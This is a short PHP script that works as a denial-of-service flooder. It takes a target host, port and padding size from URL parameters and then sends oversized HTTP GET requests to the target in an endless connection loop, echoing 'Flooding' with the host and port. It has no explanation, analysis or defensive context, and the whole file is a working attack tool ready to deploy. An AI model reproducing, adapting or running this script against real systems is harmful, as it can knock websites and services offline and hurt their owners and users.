<?php
error_reporting(0);

$host=$_GET['host'];
$port=$_GET['port'];
$buffer=$_GET['buff'];

$packet="";
for($x=0;$x<$buffer;$x++) {
    $packet.="A";
}

$headers="GET /$packet HTTP/1.1\r\n";
$headers.= "Host: $host\r\n";
$headers.= "Connection: close\r\n\r\n";
$headers.=$packet;

if(!empty($host) && !empty($port) && !empty($buffer)) {
    echo "Flooding $host On Port $port";
    while(true) {
        $s=socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_connect($s, $host, $port);
        if(!socket_write($s, $headers, strlen($headers))) {
            exit();
        }
        socket_close($s);
    }
}
